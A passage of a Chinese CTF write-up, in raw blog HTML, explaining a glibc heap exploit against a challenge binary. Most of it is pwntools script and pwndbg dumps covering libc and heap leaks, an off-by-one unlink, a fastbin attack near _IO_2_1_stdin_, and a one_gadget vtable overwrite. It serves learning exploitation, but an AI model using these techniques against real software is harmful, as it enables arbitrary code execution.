class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">_IO_2_1_stdin_ = libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">one_gadgets =[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget = libc.address + one_gadgets[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">fake_target = _IO_2_1_stdin_ + <span class="number">160</span> - <span class="number">0x3</span></span><br><span class="line">cmd_add(<span class="number">0xc0</span>,<span class="string">&#x27;AAAAAAAA&#x27;</span>) <span class="comment"># index 2</span></span><br><span class="line">cmd_add(<span class="number">0x60</span>,<span class="string">&#x27;BBBBBBBB&#x27;</span>) <span class="comment"># index 3</span></span><br><span class="line"></span><br><span class="line">cmd_del(<span class="number">1</span>)	</span><br><span class="line">cmd_del(<span class="number">2</span>)</span><br><span class="line">cmd_add(<span class="number">0xc0</span>,flat(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x38</span>,<span class="number">0x71</span>,fake_target)) <span class="comment"># to index 2</span></span><br><span class="line">cmd_add(<span class="number">0xa8</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(one_gadget)*<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite vtable</span></span><br><span class="line">fake_vtable = heap_addr + <span class="number">0x210</span></span><br><span class="line">success(<span class="string">&#x27;fake_vtable &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(fake_vtable))</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span>+flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xffffffff</span>,<span class="number">0</span>,<span class="number">0</span>,fake_vtable,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">cmd_add(<span class="number">0x60</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">cmd_add(<span class="number">0x60</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>这时大佬泄露 libc_base 的过程（和我的想法一致，但堆风水比我好了不少）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak libc_base</span></span><br><span class="line">cmd_add(<span class="number">0x40</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">cmd_add(<span class="number">0x60</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">cmd_add(<span class="number">0xf0</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">cmd_add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">offset = <span class="number">0x7ffff7bcdb78</span> - <span class="number">0x7ffff7bcdb0a</span></span><br><span class="line">cmd_del(<span class="number">2</span>) </span><br><span class="line">cmd_add(<span class="number">0xf0</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># 申请回来相同的chunk,是为了可以打印出来</span></span><br><span class="line"></span><br><span class="line">main_arena = u64(cmd_show(<span class="number">2</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) + offset</span><br><span class="line">offset = <span class="number">0x7f3d7a680b78</span> - <span class="number">0x7f3d7a2bc000</span></span><br><span class="line">libc.address = main_arena - offset</span><br><span class="line">success(<span class="string">&#x27;main_arena &gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br></pre></td></tr></table></figure>
<p>堆布局如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x56164214f000</span></span><br><span class="line">Size: <span class="number">0x1011</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x561642150010</span> <span class="comment">// chunk0</span></span><br><span class="line">Size: <span class="number">0x51</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x561642150060</span> <span class="comment">// chunk1</span></span><br><span class="line">Size: <span class="number">0x71</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5616421500d0</span> <span class="comment">// chunk2</span></span><br><span class="line">Size: <span class="number">0x101</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5616421501d0</span> <span class="comment">// chunk3</span></span><br><span class="line">Size: <span class="number">0x21</span></span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5616421501f0</span></span><br><span class="line">Size: <span class="number">0x20e11</span></span><br></pre></td></tr></table></figure>
<p>释放 chunk2 后，chunk2进入 unsortedbin ，重新申请回来使其在保留 leak 数据的前提下可以被 show 出来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5616421500d0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5616421500d0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5616421500d8</span> ◂— <span class="number">0x101</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x5616421500e0</span> —▸ <span class="number">0x7ff69bf5cb0a</span> (__realloc_hook+<span class="number">2</span>) ◂— <span class="number">0x7ff69bc1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x5616421500e8</span> —▸ <span class="number">0x7ff69bf5cb78</span> (main_arena+<span class="number">88</span>) —▸ <span class="number">0x5616421501f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x5616421500f0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">3</span> skipped</span><br></pre></td></tr></table></figure>
<p>“0x7ff69bf5cb0a”被 leak 出来，直接计算 libc_base</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak heap_addr</span></span><br><span class="line">cmd_add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># 4</span></span><br><span class="line">cmd_del(<span class="number">3</span>)</span><br><span class="line">cmd_del(<span class="number">4</span>)</span><br><span class="line">cmd_add(<span class="number">0x10</span>,<span class="string">&#x27;&#x27;</span>) <span class="comment"># FIFO,先申请chunk4(作为chunk3)</span></span><br><span class="line"></span><br><span class="line">heap_addr = u64(cmd_show(<span class="number">3</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x10a</span> + <span class="number">0x10</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure>
<p>堆布局如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5622703620d0</span> <span class="comment">// chunk2</span></span><br><span class="line">Size: <span class="number">0x101</span></span><br><span class="line"></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(fastbins)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x5622703621d0 <span class="comment">// chunk3</span></span></span><br><span class="line"><span class="function">Size: 0x21</span></span><br><span class="line"><span class="function">fd: 0x00</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Allocated chunk | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x5622703621f0 <span class="comment">// chunk4(作为chunk3)</span></span></span><br><span class="line"><span class="function">Size: 0x21</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5622703621f0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5622703621f0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5622703621f8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x562270362200</span> —▸ <span class="number">0x56227036210a</span> ◂— <span class="number">0x0</span> </span><br><span class="line">    <span class="comment">/* 残留的FD,原本该指向chunk3 head,但是末尾的&quot;\n&quot;覆盖了最后一字节 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x562270362208</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x562270362210</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x562270362218</span> ◂— <span class="number">0x20df1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x562270362220</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x562270362228</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>“0x56227036210a”会被 leak 出来，可以计算 heap_addr（heap首地址）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># unlink for overlapping</span></span><br><span class="line">cmd_del(<span class="number">0</span>) </span><br><span class="line">cmd_add(<span class="number">0x40</span>,flat(<span class="number">0</span>,<span class="number">0xb1</span>,heap_addr+<span class="number">0x18</span>,heap_addr+<span class="number">0x20</span>,heap_addr+<span class="number">0x10</span>)) <span class="comment"># chunk0</span></span><br><span class="line">cmd_del(<span class="number">1</span>)</span><br><span class="line">cmd_add(<span class="number">0x68</span>,flat(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x60</span>,<span class="number">0xb0</span>)) <span class="comment"># chunk1(off-by-one覆盖chunk2-&gt;size)</span></span><br><span class="line">cmd_del(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<p>因为本程序的修改模块失效，所以大佬用了这种方式进行修改（fastbin的性质）</p>
<p>free第三块chunk前堆的情况： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5559a9d3f010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span> <span class="comment">// chunk0(index0)</span></span><br><span class="line"><span class="number">0x5559a9d3f020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000000b1</span></span><br><span class="line"><span class="number">0x5559a9d3f030</span>:	<span class="number">0x00005559a9d3f028</span>	<span class="number">0x00005559a9d3f030</span></span><br><span class="line"><span class="number">0x5559a9d3f040</span>:	<span class="number">0x00005559a9d3f020</span>	<span class="number">0x000000000000000a</span></span><br><span class="line"><span class="number">0x5559a9d3f050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> <span class="comment">// chunk1(index1)</span></span><br><span class="line"><span class="number">0x5559a9d3f070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f0a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f0b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f0c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f0d0</span>:	<span class="number">0x00000000000000b0</span>	<span class="number">0x0000000000000100</span> <span class="comment">// chunk2(index2)</span></span><br><span class="line"><span class="number">0x5559a9d3f0e0</span>:	<span class="number">0x00007fd844656b0a</span>	<span class="number">0x00007fd844656b78</span></span><br><span class="line"><span class="number">0x5559a9d3f0f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>free第三块chunk后，堆成功重叠： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5559a9d3f010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span> <span class="comment">// chunk0(index0)</span></span><br><span class="line"><span class="number">0x5559a9d3f020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000001b1</span> <span class="comment">// will be chunk2(index2)</span></span><br><span class="line"><span class="number">0x5559a9d3f030</span>:	<span class="number">0x00007fd844656b78</span>	<span class="number">0x00007fd844656b78</span></span><br><span class="line"><span class="number">0x5559a9d3f040</span>:	<span class="number">0x00005559a9d3f028</span>	<span class="number">0x000000000000000a</span></span><br><span class="line"><span class="number">0x5559a9d3f050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> <span class="comment">// chunk1(index1)</span></span><br><span class="line"><span class="number">0x5559a9d3f070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f0a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f0b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f0c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f0d0</span>:	<span class="number">0x00000000000000b0</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x5559a9d3f0e0</span>:	<span class="number">0x00007fd844656b0a</span>	<span class="number">0x00007fd844656b78</span></span><br><span class="line"><span class="number">0x5559a9d3f0f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5559a9d3f100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x5559a9d3f020</span> —▸ <span class="number">0x7fd844656b78</span> (main_arena+<span class="number">88</span>) ◂— <span class="number">0x5559a9d3f020</span></span><br><span class="line">    <span class="comment">/* chunk2和chunk1重叠,chunk1在free状态下被写入FD */</span></span><br></pre></td></tr></table></figure>
<p>unlink 成功了（其实我以前学习 wiki 上的案例时，遇到的都是要在 chunk_list 中打 unlink 的，今天遇到这个才发现 unlink 其实很灵活）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fastbins attack</span></span><br><span class="line">_IO_file_jumps = libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">_IO_2_1_stdin_ = libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">one_gadgets =[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget = libc.address + one_gadgets[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">fake_target = _IO_2_1_stdin_ + <span class="number">160</span> - <span class="number">0x3</span> <span class="comment"># 这个地方正好有&quot;0x7f&quot;</span></span><br><span class="line">cmd_add(<span class="number">0xc0</span>,<span class="string">&#x27;AAAAAAAA&#x27;</span>) <span class="comment"># index 2</span></span><br><span class="line">cmd_add(<span class="number">0x60</span>,<span class="string">&#x27;BBBBBBBB&#x27;</span>) <span class="comment"># index 3</span></span><br><span class="line"></span><br><span class="line">cmd_del(<span class="number">1</span>)	</span><br><span class="line">cmd_del(<span class="number">2</span>) </span><br><span class="line">cmd_add(<span class="number">0xc0</span>,flat(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x38</span>,<span class="number">0x71</span>,fake_target)) <span class="comment"># to index 2</span></span><br><span class="line">cmd_add(<span class="number">0xa8</span>,p64(<span class="number">0</span>)*<span class="number">2</span>+p64(one_gadget)*<span class="number">19</span>)</span><br></pre></td></tr></table></figure>
<p>接下来的 chunk 申请，都应该在 fake chunk 中分割：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55efe9805010</span></span><br><span class="line"><span class="number">0x55efe9805010</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span></span><br><span class="line"><span class="number">0x55efe9805020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000000d1</span> <span class="comment">// fake chunk(index2)</span></span><br><span class="line"><span class="number">0x55efe9805030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55efe9805040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55efe9805050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55efe9805060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000071</span> <span class="comment">// chunk1(index1)</span></span><br><span class="line"><span class="number">0x55efe9805070</span>:	<span class="number">0x00007f39e554a97d</span>	<span class="number">0x000000000000000a</span> <span class="comment">// fake_target</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x00007f39e554a97d</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f39e554a97d</span> (_IO_2_1_stdin_+<span class="number">157</span>) ◂— <span class="number">0x39e554a9c0000000</span> <span class="comment">// presize</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f39e554a985</span> (_IO_2_1_stdin_+<span class="number">165</span>) ◂— <span class="number">0x7f</span> <span class="comment">// size</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7f39e554a98d</span> (_IO_2_1_stdin_+<span class="number">173</span>) ◂— <span class="number">0x0</span> <span class="comment">// FD</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7f39e554a995</span> (_IO_2_1_stdin_+<span class="number">181</span>) ◂— <span class="number">0x0</span> <span class="comment">// BK</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7f39e554a99d</span> (_IO_2_1_stdin_+<span class="number">189</span>) ◂— <span class="number">0xffffffff000000</span> </span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7f39e554a9a5</span> (_IO_2_1_stdin_+<span class="number">197</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7f39e554a9ad</span> (_IO_2_1_stdin_+<span class="number">205</span>) ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7f39e554a9b5</span> (_IO_2_1_stdin_+<span class="number">213</span>) ◂— <span class="number">0x39e55496e0000000</span> <span class="comment">// true_target</span></span><br></pre></td></tr></table></figure>
<p>新申请的 chunk 中被装满了 one_gadget ，方便后续劫持：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55efe9805210</span></span><br><span class="line"><span class="number">0x55efe9805210</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000000b1</span></span><br><span class="line"><span class="number">0x55efe9805220</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55efe9805230</span>:	<span class="number">0x00007f39e52763a4</span>	<span class="number">0x00007f39e52763a4</span> <span class="comment">// one_gadget </span></span><br><span class="line"><span class="number">0x55efe9805240</span>:	<span class="number">0x00007f39e52763a4</span>	<span class="number">0x00007f39e52763a4</span></span><br><span class="line"><span class="number">0x55efe9805250</span>:	<span class="number">0x00007f39e52763a4</span>	<span class="number">0x00007f39e52763a4</span></span><br><span class="line"><span class="number">0x55efe9805260</span>:	<span class="number">0x00007f39e52763a4</span>	<span class="number">0x00007f39e52763a4</span></span><br><span class="line"><span class="number">0x55efe9805270</span>:	<span class="number">0x00007f39e52763a4</span>	<span class="number">0x00007f39e52763a4</span></span><br><span class="line"><span class="number">0x55efe9805280</span>:	<span class="number">0x00007f39e52763a4</span>	<span class="number">0x00007f39e52763a4</span></span><br><span class="line"><span class="number">0x55efe9805290</span>:	<span class="number">0x00007f39e52763a4</span>	<span class="number">0x00007f39e52763a4</span></span><br><span class="line"><span class="number">0x55efe98052a0</span>:	<span class="number">0x00007f39e52763a4</span>	<span class="number">0x00007f39e52763a4</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># overwrite vtable</span></span><br><span class="line">fake_vtable = heap_addr + <span class="number">0x210</span> </span><br><span class="line">success(<span class="string">&#x27;fake_vtable &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(fake_vtable))</span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span>+flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xffffffff</span>,<span class="number">0</span>,<span class="number">0</span>,fake_vtable,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">cmd_add(<span class="number">0x60</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">cmd_add(<span class="number">0x60</span>,payload)</span><br></pre></td></tr></table></figure>
<p>先看看“fake_vtable”是什么：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] fake_vtable &gt;&gt; <span class="number">0x55d3aa3da220</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x55d3aa3da210</span></span><br><span class="line"><span class="number">0x55d3aa3da210</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000000b1</span> <span class="comment">// chunk2</span></span><br><span class="line"><span class="number">0x55d3aa3da220</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span> <span class="comment">// fake_vtable</span></span><br><span class="line"><span class="number">0x55d3aa3da230</span>:	<span class="number">0x00007f64c38a03a4</span>	<span class="number">0x00007f64c38a03a4</span></span><br><span class="line"><span class="number">0x55d3aa3da240</span>:	<span class="number">0x00007f64c38a03a4</span>	<span class="number">0x00007f64c38a03a4</span></span><br><span class="line"><span class="number">0x55d3aa3da250</span>:	<span class="number">0x00007f64c38a03a4</span>	<span class="number">0x00007f64c38a03a4</span></span><br><span class="line"><span class="number">0x55d3aa3da260</span>:	<span class="number">0x00007f64c38a03a4</span>	<span class="number">0x00007f64c38a03a4</span></span><br><span class="line"><span class="number">0x55d3aa3da270</span>:	<span class="number">0x00007f64c38a03a4</span>	<span class="number">0x00007f64c38a03a4</span></span><br><span class="line"><span class="number">0x55d3aa3da280</span>:	<span class="number">0x00007f64c38a03a4</span>	<span class="number">0x00007f64c38a03a4</span></span><br><span class="line"><span class="number">0x55d3aa3da290</span>:	<span class="number">0x00007f64c38a03a4</span>	<span class="number">0x00007f64c38a03a4</span></span><br><span class="line"><span class="number">0x55d3aa3da2a0</span>:	<span class="number">0x00007f64c38a03a4</span>	<span class="number">0x00007f64c38a03a4</span></span><br></pre></td></tr></table></figure>
<p>为了方便演示，先把“fake_vtable”换为无用地址（劫持之后GDB就无法正常显示了）</p>
<p>payload覆盖前：</p>
